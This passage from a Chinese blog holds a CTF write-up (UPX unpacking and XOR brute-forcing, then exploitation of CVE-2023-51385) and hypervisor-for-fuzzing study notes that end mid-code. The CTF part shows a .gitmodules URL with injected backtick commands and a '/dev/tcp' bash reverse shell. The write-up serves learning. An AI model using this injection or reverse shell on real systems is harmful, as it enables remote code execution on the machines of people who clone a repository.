<p>HouseOfSome具体WP见官方，有时间再看：<a href="https://mp.weixin.qq.com/s/BBc-HCET6W91-tpVSs4PxQ">2023年春秋杯冬季赛WEB、PWN类题目解析</a></p>
<h2 id="upx2023"><a href="#upx2023" class="headerlink" title="upx2023"></a>upx2023</h2><p>010editor打开，将其中的 <code>upx</code> 改成 <code>UPX</code>, 然后使用<code>upx -d</code> 脱壳就行</p>
<p>其主要逻辑如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  std::ostream *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">44</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">42</span>]; <span class="comment">// [rsp+D0h] [rbp+50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+104h] [rbp+84h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> Seed; <span class="comment">// [rsp+108h] [rbp+88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10Ch] [rbp+8Ch]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  Seed = <span class="built_in">time</span>(<span class="number">0</span>i64);</span><br><span class="line">  <span class="built_in">srand</span>(Seed);</span><br><span class="line">  std::string::<span class="built_in">string</span>((std::string *)input);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;((std::ostream *)&amp;std::cout, Str);</span><br><span class="line">  std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="type">char</span>&gt;((std::istream *)&amp;std::cin, (std::string *)input);</span><br><span class="line">  std::string::<span class="built_in">string</span>((std::string *)&amp;input[<span class="number">32</span>], (<span class="type">const</span> std::string *)input);</span><br><span class="line">  <span class="built_in">change</span>((std::string *)&amp;input[<span class="number">16</span>], (std::string *)&amp;input[<span class="number">32</span>]);<span class="comment">// 矩阵转置</span></span><br><span class="line">  std::string::<span class="keyword">operator</span>=(input, &amp;input[<span class="number">16</span>]);</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)&amp;input[<span class="number">16</span>]);</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)&amp;input[<span class="number">32</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( std::string::<span class="built_in">length</span>((std::string *)input) != <span class="number">42</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (std::ostream *)std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;((std::ostream *)&amp;std::cout, <span class="string">&quot;len error&quot;</span>);</span><br><span class="line">    std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v3);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(v6, &amp;unk_46A020, <span class="number">0xA8</span>ui64);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">41</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">rand</span>() % <span class="number">255</span>;</span><br><span class="line">    v4 = (<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[](input, i);</span><br><span class="line">    <span class="keyword">if</span> ( (v8 ^ *v4) != v6[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)input);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>异或问题：<strong>爆破时间戳（根据已知字符，前两个字符固定为 <code>f&#123;</code>）</strong>。change 函数是一个矩阵转化，因此可以直接使用字符串测试，并且得到其mapping，最后得到其结果</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">t1 = <span class="built_in">list</span>(<span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890ABCDEF&quot;</span>)</span><br><span class="line">r1 = <span class="built_in">list</span>(<span class="string">&quot;aeimquy37AEbdfhjlnprtvxz24680BDFcgkosw159C&quot;</span>)</span><br><span class="line"></span><br><span class="line">t2 = <span class="string">&quot;flag&#123;abcdefghijklmnopqrstuvwxyz1234567890&#125;&quot;</span></span><br><span class="line">r2 = <span class="string">&quot;f&#123;dhlptx260lgacegikmoqsuwy13579&#125;abfjnrvz48&quot;</span></span><br><span class="line"></span><br><span class="line">mapping = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c in <span class="built_in">enumerate</span>(t1):</span><br><span class="line">    <span class="keyword">for</span> j, v in <span class="built_in">enumerate</span>(r1):</span><br><span class="line">        <span class="keyword">if</span> c == v:</span><br><span class="line">            mapping[i] = j</span><br><span class="line"><span class="built_in">print</span>(mapping)</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    assert t2[i] == r2[mapping[i]]</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">list</span>(<span class="string">&quot;f&#123;52bgb-281lg00ff-46f7-ca009c8e&#125;a381-b7191&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">42</span>)</span>:</span></span><br><span class="line"><span class="function">    print(flag[mapping[i]], end=</span><span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="modules"><a href="#modules" class="headerlink" title="modules"></a>modules</h2><p>CVE-2023-51385<del>（gitee 搜索就有答案</del></p>
<p>如何利用看下面两篇文章就行</p>
<ul>
<li><a href="https://blog.csdn.net/mirocky/article/details/135485164">CVE-2023-51385 OpenSSH ProxyCommand命令注入漏洞</a></li>
<li><a href="https://vin01.github.io/piptagole/ssh/security/openssh/libssh/remote-code-execution/2023/12/20/openssh-proxycommand-libssh-rce.html">SSH ProxyCommand  (CVE-2023-51385）</a></li>
</ul>
<p>新建一个 <code>gitee</code> 仓库，添加一个 <code>.gitmodules</code> 文件，反弹shell。后面的域名需要与 <code>.config</code> 文件一致</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[submodule &quot;cves&quot;]</span><br><span class="line">  path = cves</span><br><span class="line">  url = ssh://`bash exp.sh`foo.ichunqiu.com/bar</span><br></pre></td></tr></table></figure>

<p>在库里创建一个 <code>exp.sh</code> 文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>clone 仓库触发漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> &lt;repo&gt; --recurse-submodules</span><br></pre></td></tr></table></figure>

<p>比赛时 curl 主机没有回显，在赛后才想到可能是<code>VPS 防火墙</code>的问题</p>
<ul>
<li>然后curl了一下vps，发现没有接收到，后来又发现 4444 端口不行，换成 9999 端口就行😥</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ufw allow port</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>hypervisor-in-rust-0</title>
    <url>/2024/07/28/hypervisor-in-rust-0/</url>
    <content><![CDATA[<blockquote>
<p>hypervisors and high-performance fuzzing.</p>
</blockquote>
<span id="more"></span>

<p>最近学习模糊测试，一些fuzzer借助硬件辅助来提高效率，在找资料时找到了不错的教程，因此学习<del>（CV</del>一下 : <a href="https://tandasat.github.io/Hypervisor-101-in-Rust/">Hypervisor 101 in Rust</a></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://gcc.ac/gcc_2023/">Global Cybersecurity Camp 2023 Singapore</a>.</p>
<p>硬件辅助的高性能fuzzer开发，Fuzzing UEFI + 配套练习</p>
<h3 id="课程前提"><a href="#课程前提" class="headerlink" title="课程前提"></a>课程前提</h3><ol>
<li>熟悉x86_64架构</li>
</ol>
<ul>
<li>如果不熟悉，推荐了课程：<a href="https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Arch2001_x86-64_OS_Internals+2021_v1/course/">Course | Arch2001 | OpenSecurityTraining2 (ost2.fyi)</a></li>
</ul>
<ol start="2">
<li>Rust经历有用，但是不是必要的</li>
<li>下载相关文档</li>
</ol>
<ul>
<li><a href="https://www.intel.com/sdm/">Intel 64 and IA-32 Architectures Software Developer’s Manual Volume 3</a></li>
<li><a href="https://developer.amd.com/resources/developer-guides-manuals/">AMD64 Architecture Programmer’s Manual Volume 2: System Programming</a></li>
</ul>
<ol start="4">
<li>需要一台能支持Intel-VT&#x2F;AMD-V的电脑</li>
</ol>
<h3 id="课程目标"><a href="#课程目标" class="headerlink" title="课程目标"></a>课程目标</h3><ul>
<li>理解x86_64硬件辅助虚拟化技术</li>
<li>熟悉如何将虚拟化技术应用到高性能fuzzing中</li>
</ul>
<h3 id="动机"><a href="#动机" class="headerlink" title="动机"></a>动机</h3><p>Hypervisor</p>
<ul>
<li>cool: 云服务的基础，KVM, hyper-V, Xen, Nitro Hypervisor</li>
<li>有趣的:<ul>
<li>主要的安全特性基础, Virtualization Based Security, Secured-core PC</li>
<li>安全研究,  <a href="https://github.com/matsu/bitvisor/tree/master/core">BitVisor</a>, Intel’s <a href="https://github.com/intel/vbh">Virtualization Based Hardening</a></li>
</ul>
</li>
<li>方便: <ul>
<li>系统级隔离: VMware Workstation&#x2F;Fusion, <a href="https://github.com/projectacrn/acrn-hypervisor">ACRN</a>, Nitro Hypervisor, <a href="https://www.qubes-os.org/">Qubes OS</a></li>
<li>系统级监视:  <a href="https://github.com/AsahiLinux/m1n1">Asahi Linux m1n1 Hypervisor</a>, <a href="https://cuckoosandbox.org/">Cuckoo Sandbox</a>, <a href="https://github.com/hvmi">HVMI</a>, <a href="https://nyx-fuzz.com/">kAFL&#x2F;Nyx</a>, <a href="https://github.com/cheat-engine/cheat-engine/">Cheat Engine DBVM</a>, <a href="https://en.wikipedia.org/wiki/Blue_Pill_(software)">Blue Pill</a>, antivirus-hypervisors</li>
</ul>
</li>
</ul>
<h3 id="如何完成"><a href="#如何完成" class="headerlink" title="如何完成"></a>如何完成</h3><p>我无法创造的，我就不理解。– 费曼</p>
<p>熟悉相关的特性，引用开源的实现</p>
<ul>
<li>看文档 + 看代码，知道如何实现或者CV</li>
</ul>
<h3 id="可以学习到什么"><a href="#可以学习到什么" class="headerlink" title="可以学习到什么"></a>可以学习到什么</h3><ul>
<li>一个可以运行并且fuzz目标的hypervisor</li>
<li>跨平台的hypervisor开发和debug</li>
<li>为自己的测试扩展功能</li>
<li>更好的理解&#x2F;阅读现存的hypervisor相关实现的代码</li>
<li>开发自己的hypervisor</li>
</ul>
<h3 id="fuzzer设计"><a href="#fuzzer设计" class="headerlink" title="fuzzer设计"></a>fuzzer设计</h3><p>灰盒测试，基于变异，边覆盖率引导<br>快照功能<br>输入：快照文件，样本库，patch 文件</p>
<h3 id="hypervisor设计"><a href="#hypervisor设计" class="headerlink" title="hypervisor设计"></a>hypervisor设计</h3><p>从快照创建一个虚拟机<br>开始fuzzing</p>
<ul>
<li>向内存注入变异的输入</li>
<li>VM运行</li>
<li>观察&#x2F;收集可能的BUG<br>一次迭代后恢复快照<br>运行尽可能多的VM<br>使用Rust书写的UEFI<br>在Bochs&#x2F;VMware测试，选择裸机型号（应该时选择Intel or AMD?）</li>
</ul>
<h3 id="不是如下的课程类型"><a href="#不是如下的课程类型" class="headerlink" title="不是如下的课程类型"></a>不是如下的课程类型</h3><ul>
<li>Rust编程课</li>
<li>模糊测试课程<ul>
<li>可以在这里寻求相关建议: <a href="https://discord.com/invite/QxxTBCw">Awesome Fuzzing</a></li>
</ul>
</li>
<li>学习已经存在的软件相关原理</li>
<li>比较详细提供代码的细节，一些注释可能过于简单并且可能是不正确的</li>
</ul>
<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>应该是作者现场演示，我们可以clone下来代码仓库运行</p>
<h3 id="为什么是Hypervisor"><a href="#为什么是Hypervisor" class="headerlink" title="为什么是Hypervisor"></a>为什么是Hypervisor</h3><p>优点</p>
<ul>
<li>不局限于用户态的fuzzing</li>
<li>比模拟器块</li>
</ul>
<p>比较优秀的案例</p>
<ul>
<li>Customized hypervisors: <a href="https://github.com/intel/kernel-fuzzer-for-xen-project">KF&#x2F;x</a> (Xen), <a href="https://nyx-fuzz.com/">kAFL&#x2F;Nyx</a> (KVM), <a href="https://www.microsoft.com/en-us/research/publication/hyperfuzzer-an-efficient-hybrid-fuzzer-for-virtual-cpus/">HyperFuzzer</a> (Hyper-V)</li>
<li>Using hypervisor API: <a href="https://github.com/0vercl0k/wtf">What The Fuzz</a>, <a href="https://github.com/quarkslab/rewind">Rewind</a>, <a href="https://github.com/Impalabs/hyperpom">Hyperpom</a>, <a href="https://aws.amazon.com/blogs/opensource/announcing-snapchange-an-open-source-kvm-backed-snapshot-fuzzing-framework/">Snapchange</a></li>
<li>Original hypervisors: <a href="https://github.com/gamozolabs/falkervisor_grilled_cheese">FalkVisor</a>, <a href="https://github.com/Cisco-Talos/Barbervisor">Barbervisor</a></li>
</ul>
<h3 id="UEFI-应用"><a href="#UEFI-应用" class="headerlink" title="UEFI 应用"></a>UEFI 应用</h3><p>先于操作系统启动，更快的BIOS</p>
<p><a href="https://uefi.org/">Unified Extensible Firmware Interface Forum</a></p>
<p>UEFI好处</p>
<ul>
<li>减少系统资源的浪费</li>
<li>与操作系统无关的设计和开发环境</li>
<li>兼容性好</li>
<li>比较容易访问硬件特性</li>
<li>文档比较齐全</li>
</ul>
<h3 id="Rust"><a href="#Rust" class="headerlink" title="Rust"></a>Rust</h3><p>为什么选择了rust</p>
<ul>
<li>相对与C&#x2F;C++来说，更方便的UEFI</li>
<li>更多的lib和crate</li>
<li>编译器比较严格，减少BUG</li>
<li>具有安全意识的工程师，现如今应该选择Rust</li>
</ul>
<p>hypervisor…</p>
<h2 id="Hypervisor"><a href="#Hypervisor" class="headerlink" title="Hypervisor"></a>Hypervisor</h2><p>VMM: Virtual Machine Monitor，和 hypervisor 等价。</p>
<p>两类虚拟化技术：</p>
<ul>
<li>直接运行在硬件上：VMware ESXi, Windows Hyper-V…</li>
<li>运行在操作系统上：VMware Workstation，VirtualBox，QEMU…</li>
</ul>
<p>虚拟化主要分为几大类：</p>
<ul>
<li><strong>计算虚拟化</strong>，针对CPU和内存资源虚拟化技术。</li>
<li><strong>网络虚拟化</strong>，针对网络链路资源虚拟化技术。</li>
<li><strong>IO虚拟化</strong>，针对IO资源虚拟化技术。</li>
<li><strong>存储虚拟化</strong>，针对磁盘存储资源虚拟化技术。</li>
</ul>
<h2 id="Intel-VT"><a href="#Intel-VT" class="headerlink" title="Intel-VT"></a>Intel-VT</h2><p>虽然说本机电脑时AMD CPU，但是网上Intel-VT内容比较多，有问题也好解决，因此首先学习了部分知识。<del>并且知识都是相通的</del></p>
<p>因此介绍不会很细😋，毕竟有了源码也不能用😭</p>
<p>不错的学习资源，因为是AMD的CPU，主要还是了解概念以及思路</p>
<ul>
<li><a href="https://space.bilibili.com/3493135044840333/channel/collectiondetail?sid=1118442">rust-hypervisor-x86</a></li>
<li><a href="https://blog.csdn.net/qq_41988448/category_11624333.html">Intel-VT</a></li>
<li><a href="https://bbs.kanxue.com/thread-281142.htm">Hypervisor From Scratch 翻译</a></li>
</ul>
<p>在<a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel® 64 and IA-32 Architectures Software Developer Manuals</a>搜索<code>Intel 64 and IA-32 Architectures Software Developer’s Manual Volume 3</code></p>
<p>部分一些专业术语</p>
<ul>
<li>Intel VT-X: Virtualization Technology for x86</li>
<li>guest-mode: VMX non-root operation</li>
<li>host-mode: VMX root operation</li>
<li>VMX: Virtual-Machine eXtensions</li>
<li>VMCS: virtual-machine control data structures</li>
<li>EPT: Extend Page Table</li>
<li>VT-D: Virtualization Technology for Directed I&#x2F;O</li>
<li>GPA: Guest Physical Address</li>
<li>HPA: Host Physical Address</li>
</ul>
<h3 id="VMX"><a href="#VMX" class="headerlink" title="VMX"></a>VMX</h3><p><strong>VMM host-guest</strong></p>
<ul>
<li>VMM通过执行<code>VMXON</code>指令进入VMX操作，然后就是类似一个操作系统的启动过程。</li>
<li><code>VM Entry</code>：VMM 可以进入 guest。 VMM使用指令<code>VMLAUNCH</code>和<code>VMRESUME</code>进行VM切换（可以有很多guest）；使用 <code>VM Exit</code> 返回host。</li>
<li><code>VM Exit</code>: 将控制转移到VMM指定的入口点。 VMM可以针对<code>VM Exit</code>的原因采取适当的操作</li>
<li>最终，VMM 可能决定自行关闭并离开 VMX 操作。 它通过执行 VMXOFF 指令来实现这一点。</li>
</ul>
<p>**VMCS 组成:**（VMCS 区域是4 KB（位 11:0 必须为零），必须与 4KB 边界对齐）</p>
<ul>
<li>guest state area：在 VM-entry时，处理器的状态信息从guest-state区域中加载。在VM-exit时，处理器的当前状态信息保存在guest-state区域。</li>
<li>host state area：在VM-exit时，处理器的状态信息从host-state区域中加载。</li>
<li>VM-execution control field：在进入VM后，处理器的行为由VM-execution控制区域中的字段提供控制。</li>
<li>VM-EXIT control field：控制处理器在处理VM-exit时的行为，也影响返回VMM后处理器的某些状态。</li>
<li>VM-ENTRY control field：控制处理器在处理VM-entry时的行为，也决定进入VM后处理器的某些状态。</li>
<li>VM-EXIT infomation field：记录引起VM-exit事件的原因及相关的明细信息。</li>
</ul>
<p><strong>一个大致的框架：</strong></p>
<ol>
<li>检查硬件是否支持VMX: <code>CPUID.1:ECX.VMX[bit 5] = 1</code></li>
<li>启用VMX: 令<code>CR4.VMXE[bit 13] = 1</code>，然后通过执行VMXON指令进入VMX操作。</li>
<li>检查内核中的VMX支持情况:  <strong>IA32_FEATURE_CONTROL</strong> MSR（MSR 地址 3AH）以查看 <strong>锁定位</strong> 是否已设置</li>
<li>分配VMXON区域: 物理地址并使用分配区域的指针执行VMXON指令，并且查询 <code>MSR_IA32_VMX_BASIC</code>。（Intel 手册：在执行 VMXON 之前，软件应将 VMCS 修订标识符写入 VMXON 区域。 具体来说，它应该将 31 位 VMCS 修订标识符写入 VMXON 区域前 4 个字节的位 30:0；位 31 应清除为 0。）</li>
<li>分配VMCS区域: VMPTRLD，处理器中可能同时存在多个 VMCS，但当前只有其中一个处于活动状态，并且 VMLAUNCH、VMREAD、VMRESUME 和 VMWRITE 指令仅在当前 VMCS 上运行。</li>
<li>终止VMX并释放我们之前分配的所有内存: VMOFF，并且释放分配的内存（将<code>VMXON</code>和<code>VMCS Region</code>转换为虚拟地址</li>
</ol>
<h4 id="for-example"><a href="#for-example" class="headerlink" title="for example"></a>for example</h4><p>阅读一下 <a href="https://github.com/tandasat/HyperPlatform">Intel VT-x based hypervisor aiming to provide a thin VM-exit filtering platform on Windows</a></p>
<p><strong>一个框架，而不是具体应用</strong>。因此可能缺少一点逻辑</p>
<h5 id="DriverEntry"><a href="#DriverEntry" class="headerlink" title="DriverEntry"></a>DriverEntry</h5><p>DriverEntry() 调用了 VmInitialization()</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Checks if a VMM can be installed, and so, installs it</span></span><br><span class="line"><span class="function">_Use_decl_annotations_ NTSTATUS <span class="title">VmInitialization</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">PAGED_CODE</span>()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">VmpIsHyperPlatformInstalled</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> STATUS_CANCELLED;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">VmpIsVmxAvailable</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> STATUS_HV_FEATURE_UNAVAILABLE;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="keyword">auto</span> shared_data = <span class="built_in">VmpInitializeSharedData</span>();</span><br><span class="line">  <span class="keyword">if</span> (!shared_data) &#123;</span><br><span class="line">    <span class="keyword">return</span> STATUS_MEMORY_NOT_ALLOCATED;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Read and store all MTRRs to set a correct memory type for EPT</span></span><br><span class="line">  <span class="built_in">EptInitializeMtrrEntries</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Virtualize all processors</span></span><br><span class="line">  <span class="keyword">auto</span> status = <span class="built_in">UtilForEachProcessor</span>(VmpStartVm, shared_data);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">    <span class="built_in">UtilForEachProcessor</span>(VmpStopVm, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先检查是否之前安装过</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cpuid( </span><br><span class="line">	<span class="type">int</span> cpuInfo[<span class="number">4</span>],   <span class="comment">// 包含在 EAX、EBX、ECX 和 EDX 中返回的有关 CPU 支持的功能的信息。</span></span><br><span class="line">	<span class="type">int</span> function_id   <span class="comment">// 在 EAX 中传递的指定要检索的信息的代码</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tests if HyperPlatform is already installed</span></span><br><span class="line"><span class="function">_Use_decl_annotations_ <span class="type">static</span> <span class="type">bool</span> <span class="title">VmpIsHyperPlatformInstalled</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">PAGED_CODE</span>()</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> cpu_info[<span class="number">4</span>] = &#123;&#125;;</span><br><span class="line">  __cpuid(cpu_info, <span class="number">1</span>);</span><br><span class="line">  <span class="type">const</span> CpuFeaturesEcx cpu_features = &#123;<span class="built_in">static_cast</span>&lt;ULONG32&gt;(cpu_info[<span class="number">2</span>])&#125;;</span><br><span class="line">  <span class="keyword">if</span> (!cpu_features.fields.not_used) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  __cpuid(cpu_info, kHyperVCpuidInterface);</span><br><span class="line">  <span class="keyword">return</span> cpu_info[<span class="number">0</span>] == <span class="string">&#x27;PpyH&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查CPU和操作系统支持</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Checks if the system supports virtualization</span></span><br><span class="line"><span class="function">_Use_decl_annotations_ <span class="type">static</span> <span class="type">bool</span> <span class="title">VmpIsVmxAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">PAGED_CODE</span>()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// See: DISCOVERING SUPPORT FOR VMX</span></span><br><span class="line">  <span class="comment">// If CPUID.1:ECX.VMX[bit 5]=1, then VMX operation is supported.</span></span><br><span class="line">  <span class="type">int</span> cpu_info[<span class="number">4</span>] = &#123;&#125;;</span><br><span class="line">  __cpuid(cpu_info, <span class="number">1</span>);</span><br><span class="line">  <span class="type">const</span> CpuFeaturesEcx cpu_features = &#123;<span class="built_in">static_cast</span>&lt;ULONG32&gt;(cpu_info[<span class="number">2</span>])&#125;;</span><br><span class="line">  <span class="keyword">if</span> (!cpu_features.fields.vmx) &#123;</span><br><span class="line">    <span class="built_in">HYPERPLATFORM_LOG_ERROR</span>(<span class="string">&quot;VMX features are not supported.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// See: BASIC VMX INFORMATION</span></span><br><span class="line">  <span class="comment">// The first processors to support VMX operation use the write-back type.</span></span><br><span class="line">  <span class="type">const</span> Ia32VmxBasicMsr vmx_basic_msr = &#123;<span class="built_in">UtilReadMsr64</span>(Msr::kIa32VmxBasic)&#125;;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">static_cast</span>&lt;memory_type&gt;(vmx_basic_msr.fields.memory_type) !=</span><br><span class="line">      memory_type::kWriteBack) &#123;</span><br><span class="line">    <span class="built_in">HYPERPLATFORM_LOG_ERROR</span>(<span class="string">&quot;Write-back cache type is not supported.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// See: ENABLING AND ENTERING VMX OPERATION</span></span><br><span class="line">  Ia32FeatureControlMsr vmx_feature_control = &#123;</span><br><span class="line">      <span class="built_in">UtilReadMsr64</span>(Msr::kIa32FeatureControl)&#125;;</span><br><span class="line">  <span class="keyword">if</span> (!vmx_feature_control.fields.lock) &#123;</span><br><span class="line">    <span class="built_in">HYPERPLATFORM_LOG_INFO</span>(<span class="string">&quot;The lock bit is clear. Attempting to set 1.&quot;</span>);</span><br><span class="line">    <span class="type">const</span> <span class="keyword">auto</span> status = <span class="built_in">UtilForEachProcessor</span>(VmpSetLockBitCallback, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!vmx_feature_control.fields.enable_vmxon) &#123;</span><br><span class="line">    <span class="built_in">HYPERPLATFORM_LOG_ERROR</span>(<span class="string">&quot;VMX features are not enabled.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">EptIsEptAvailable</span>()) &#123;</span><br><span class="line">    <span class="built_in">HYPERPLATFORM_LOG_ERROR</span>(<span class="string">&quot;EPT features are not fully supported.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="DriverUnload"><a href="#DriverUnload" class="headerlink" title="DriverUnload"></a>DriverUnload</h5><p>调用VmTermination关闭VMM</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Terminates VM</span></span><br><span class="line"><span class="function">_Use_decl_annotations_ <span class="type">void</span> <span class="title">VmTermination</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">PAGED_CODE</span>()</span><br><span class="line"></span><br><span class="line">  <span class="built_in">HYPERPLATFORM_LOG_INFO</span>(<span class="string">&quot;Uninstalling VMM.&quot;</span>);</span><br><span class="line">  <span class="keyword">auto</span> status = <span class="built_in">UtilForEachProcessor</span>(VmpStopVm, <span class="literal">nullptr</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">    <span class="built_in">HYPERPLATFORM_LOG_INFO</span>(<span class="string">&quot;The VMM has been uninstalled.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">HYPERPLATFORM_LOG_WARN</span>(<span class="string">&quot;The VMM has not been uninstalled (%08x).&quot;</span>, status);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">NT_ASSERT</span>(!<span class="built_in">VmpIsHyperPlatformInstalled</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回调函数，调用<code>VmpStopVm</code>，使用Cr4 disable <code>VMX</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Stops virtualization through a hypercall and frees all related memory</span></span><br><span class="line"><span class="function">_Use_decl_annotations_ <span class="type">static</span> NTSTATUS <span class="title">VmpStopVm</span><span class="params">(<span class="type">void</span> *context)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">UNREFERENCED_PARAMETER</span>(context);</span><br><span class="line">  <span class="built_in">PAGED_CODE</span>()</span><br><span class="line"></span><br><span class="line">  <span class="built_in">HYPERPLATFORM_LOG_INFO</span>(<span class="string">&quot;Terminating VMX for the processor %lu.&quot;</span>,</span><br><span class="line">                         <span class="built_in">KeGetCurrentProcessorNumberEx</span>(<span class="literal">nullptr</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Stop virtualization and get an address of the management structure</span></span><br><span class="line">  ProcessorData *processor_data = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">auto</span> status = <span class="built_in">UtilVmCall</span>(HypercallNumber::kTerminateVmm, &amp;processor_data);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">    <span class="keyword">return</span> 